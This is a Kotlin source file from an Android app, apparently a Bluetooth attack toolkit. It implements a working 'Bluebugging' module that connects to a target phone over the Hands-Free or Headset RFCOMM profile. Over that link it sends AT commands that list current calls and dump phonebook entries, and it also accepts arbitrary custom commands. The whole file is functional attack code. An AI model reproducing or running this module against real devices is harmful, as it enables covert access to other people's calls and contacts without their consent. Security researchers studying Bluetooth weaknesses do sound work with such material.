package com.hereliesaz.blusnu.data

import android.annotation.SuppressLint
import android.bluetooth.BluetoothDevice
import android.bluetooth.BluetoothSocket
import android.util.Log
import kotlinx.coroutines.CancellationException
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.currentCoroutineContext
import kotlinx.coroutines.ensureActive
import kotlinx.coroutines.flow.Flow
import kotlinx.coroutines.flow.callbackFlow
import kotlinx.coroutines.isActive
import kotlinx.coroutines.withContext
import java.io.IOException
import java.io.InputStream
import java.io.OutputStream
import java.util.UUID

/**
 * Module responsible for Bluebugging attacks.
 *
 * Bluebugging exploits the Headset (HSP) and Hands-Free (HFP) Bluetooth profiles
 * to send AT commands over an RFCOMM connection. Currently implemented AT commands:
 * - AT (basic probe / connection test)
 * - AT+CLCC (list current calls)
 * - AT+CPBR (read phonebook entries)
 * - AT+CSCS? (query character set)
 * - AT+CIND? (query indicator status)
 *
 * Custom AT commands can also be sent via [sendAtCommand].
 *
 * Requires BLUETOOTH_CONNECT permission and that the target device exposes
 * HSP or HFP services. Does not require root.
 */
@SuppressLint("MissingPermission")
class BluebuggingModule {

    companion object {
        private const val TAG = "BluebuggingModule"

        /** Headset Profile (HSP) UUID */
        private val HSP_UUID: UUID = UUID.fromString("00001108-0000-1000-8000-00805f9b34fb")

        /** Hands-Free Profile (HFP) UUID */
        private val HFP_UUID: UUID = UUID.fromString("0000111e-0000-1000-8000-00805f9b34fb")

        /** Common AT commands used in bluebugging reconnaissance. */
        private val COMMON_AT_COMMANDS = listOf(
            "AT" to "Basic probe",
            "AT+CLCC" to "List current calls",
            "AT+CPBR=1,99" to "Read phonebook entries 1-99",
            "AT+CSCS?" to "Query character set",
            "AT+CIND?" to "Query indicator status"
        )

        /** Read timeout in milliseconds for AT command responses. */
        private const val READ_TIMEOUT_MS = 3000L

        /**
         * Regex matching a standalone AT final result code on its own line.
         * Matches OK, ERROR, +CME ERROR: ..., or +CMS ERROR: ... only when
         * they appear as a complete line (preceded by \r\n or start-of-string).
         */
        private val AT_FINAL_RESULT_REGEX = Regex(
            """(?:^|\r\n)(OK|ERROR|\+CME ERROR:[^\r\n]*|\+CMS ERROR:[^\r\n]*)\r\n""",
            RegexOption.MULTILINE
        )
    }

    // Finding 8.4: Mark mutable cross-thread fields as @Volatile
    @Volatile
    private var socket: BluetoothSocket? = null
    @Volatile
    private var outputStream: OutputStream? = null
    @Volatile
    private var inputStream: InputStream? = null
    @Volatile
    private var isConnected: Boolean = false

    /**
     * Connects to the target device via RFCOMM on the HSP or HFP UUID.
     *
     * Tries HFP first (more capable profile), then falls back to HSP.
     *
     * @param device The BluetoothDevice to connect to.
     * @return Result.success if connected, Result.failure with the exception otherwise.
     */
    suspend fun connect(device: BluetoothDevice): Result<Unit> = withContext(Dispatchers.IO) {
        try {
            disconnect() // Clean up any previous connection

            // Try HFP first, then HSP
            var lastException: Exception? = null
            for (uuid in listOf(HFP_UUID, HSP_UUID)) {
                // Finding 8.1: Wrap socket in try-finally to prevent leak on connect failure
                var rfcommSocket: BluetoothSocket? = null
                try {
                    rfcommSocket = device.createRfcommSocketToServiceRecord(uuid)
                    rfcommSocket.connect()
                    socket = rfcommSocket
                    outputStream = rfcommSocket.outputStream
                    inputStream = rfcommSocket.inputStream
                    isConnected = true
                    Log.i(TAG, "Connected to ${device.address} via UUID $uuid")
                    return@withContext Result.success(Unit)
                } catch (e: IOException) {
                    // Finding 8.1: Close the socket in finally on failure
                    try {
                        rfcommSocket?.close()
                    } catch (_: IOException) { }
                    lastException = e
                    Log.w(TAG, "Failed to connect via UUID $uuid: ${e.message}")
                }
            }
            Result.failure(lastException ?: IOException("Failed to connect via HSP or HFP"))
        } catch (e: CancellationException) {
            // Finding 8.5: Rethrow CancellationException
            throw e
        } catch (e: SecurityException) {
            Log.e(TAG, "Permission denied connecting to ${device.address}", e)
            Result.failure(e)
        } catch (e: Exception) {
            // Finding 8.5: Rethrow CancellationException
            if (e is CancellationException) throw e
            Log.e(TAG, "Unexpected error connecting to ${device.address}", e)
            Result.failure(e)
        }
    }

    /**
     * Sends an AT command over the established RFCOMM connection and reads the response.
     *
     * The command is terminated with \r\n as required by the AT protocol.
     *
     * @param command The AT command to send (e.g. "AT+CLCC").
     * @return Result containing the response string, or failure if not connected or I/O fails.
     */
    suspend fun sendAtCommand(command: String): Result<String> = withContext(Dispatchers.IO) {
        val os = outputStream
        val iStream = inputStream
        if (os == null || iStream == null || !isConnected) {
            return@withContext Result.failure(IllegalStateException("Not connected. Call connect() first."))
        }

        try {
            // Send the AT command with CR+LF terminator
            val commandBytes = "$command\r\n".toByteArray(Charsets.UTF_8)
            os.write(commandBytes)
            os.flush()

            // Read the response with a timeout
            val response = readResponse(iStream)
            Log.d(TAG, "AT command '$command' -> '$response'")
            Result.success(response)
        } catch (e: CancellationException) {
            // Finding 8.5: Rethrow CancellationException
            throw e
        } catch (e: IOException) {
            Log.e(TAG, "I/O error sending AT command '$command'", e)
            // Finding 8.7: Disconnect on communication error
            disconnect()
            Result.failure(e)
        } catch (e: Exception) {
            // Finding 8.5: Rethrow CancellationException
            if (e is CancellationException) throw e
            Log.e(TAG, "Error sending AT command '$command'", e)
            // Finding 8.7: Disconnect on communication error
            disconnect()
            Result.failure(e)
        }
    }

    /**
     * Connects to the target and executes a sequence of common AT commands,
     * emitting each command and its response as flow events.
     *
     * Uses callbackFlow to ensure the RFCOMM socket is closed if the
     * collecting coroutine is cancelled.
     *
     * @param device The BluetoothDevice to probe.
     * @return A Flow of strings describing each command attempt and result.
     */
    fun executeCommonCommands(device: BluetoothDevice): Flow<String> = callbackFlow {
        // Finding 8.6: Close socket on flow cancellation
        invokeOnClose {
            socket?.let { s ->
                try { s.close() } catch (_: IOException) { }
            }
        }

        trySend("Connecting to ${device.address} for AT command injection...")

        val connectResult = connect(device)
        if (connectResult.isFailure) {
            trySend("Connection failed: ${connectResult.exceptionOrNull()?.message}")
            close()
            return@callbackFlow
        }
        trySend("Connected successfully via RFCOMM (HSP/HFP)")

        for ((command, description) in COMMON_AT_COMMANDS) {
            // Check for cancellation between commands
            currentCoroutineContext().ensureActive()

            trySend("Sending: $command ($description)")
            val result = sendAtCommand(command)
            if (result.isSuccess) {
                val response = result.getOrDefault("")
                if (response.isNotBlank()) {
                    trySend("Response: $response")
                } else {
                    trySend("Response: (empty)")
                }
            } else {
                trySend("Error: ${result.exceptionOrNull()?.message}")
                // If we get an IOException the socket is likely dead
                if (result.exceptionOrNull() is IOException) {
                    trySend("Connection lost. Aborting remaining commands.")
                    break
                }
            }
        }

        trySend("AT command sequence complete.")
        disconnect()
        trySend("Disconnected.")
        close()
    }

    /**
     * Closes the RFCOMM socket and releases resources.
     */
    fun disconnect() {
        isConnected = false
        try {
            outputStream?.close()
        } catch (_: IOException) { }
        try {
            inputStream?.close()
        } catch (_: IOException) { }
        try {
            socket?.close()
        } catch (_: IOException) { }
        outputStream = null
        inputStream = null
        socket = null
        Log.d(TAG, "Disconnected and cleaned up resources")
    }

    /**
     * Reads a response from the input stream with a timeout.
     * Detects EOF immediately and only treats standalone OK/ERROR lines as terminators
     * (not "OK" appearing as a substring in data such as contact names).
     */
    private fun readResponse(inputStream: InputStream): String {
        val buffer = ByteArray(1024)
        val result = StringBuilder()
        val deadline = System.currentTimeMillis() + READ_TIMEOUT_MS

        while (System.currentTimeMillis() < deadline) {
            if (inputStream.available() > 0) {
                val bytesRead = inputStream.read(buffer)
                // Finding 8.3: Detect EOF (-1) and break immediately
                if (bytesRead == -1) {
                    Log.w(TAG, "EOF detected on input stream — remote disconnected")
                    break
                }
                if (bytesRead > 0) {
                    result.append(String(buffer, 0, bytesRead, Charsets.UTF_8))
                    // Finding 8.2: Only match standalone OK\r\n or ERROR\r\n on its own line,
                    // not "OK" as a substring within contact names or other data.
                    val current = result.toString()
                    if (AT_FINAL_RESULT_REGEX.containsMatchIn(current)) {
                        break
                    }
                }
            } else {
                // Brief sleep to avoid busy-waiting
                Thread.sleep(50)
            }
        }
        return result.toString().trim()
    }
}
